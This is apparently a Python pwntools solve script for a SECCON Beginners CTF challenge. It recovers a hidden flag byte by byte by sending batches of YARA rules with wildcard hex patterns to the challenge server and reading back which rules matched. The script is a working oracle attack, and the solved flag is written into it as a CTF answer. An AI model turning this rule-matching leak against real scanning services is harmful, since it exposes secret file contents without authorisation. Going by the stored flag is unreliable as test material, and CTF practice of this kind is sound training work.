#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

remote_host = {'host':'yaro.beginners.seccon.games', 'port':5003}

def main():
    # flag = b'ctf4b{'
    flag = b'ctf4b{Y3t_An0th3r_R34d_Opp0rtun1ty}'

    rule_template = '''rule flag_{}_{:x} {{
    strings:
        $hex_string = {{{}}}
    condition:
        $hex_string
}}
'''

    while not flag.endswith(b'}'):
        with remote(**remote_host) as conn:
            rule = ''
            for h in range(2, 8):
                hex_flag = '{} {:x}?'.format(flag.hex(' '), h)
                rule += rule_template.format('high', h, hex_flag)
            for l in range(0x10):
                hex_flag = '{} ?{:x}'.format(flag.hex(' '), l)
                rule += rule_template.format('low', l, hex_flag)

            conn.sendlineafter(b'rule:', rule.encode())
            m = re.search(b'matched: \[flag_high_([2-7]), flag_low_([0-9a-f])\]', conn.recvall())
            if m is None:
                raise

            c = int(m.group(1))*0x10 + int(m.group(2), 16)
            flag += bytes([c])

            info(f'found: {c:x} {flag.decode()}')

    success(f'FLAG: {flag.decode()}')

if __name__=='__main__':
    main()

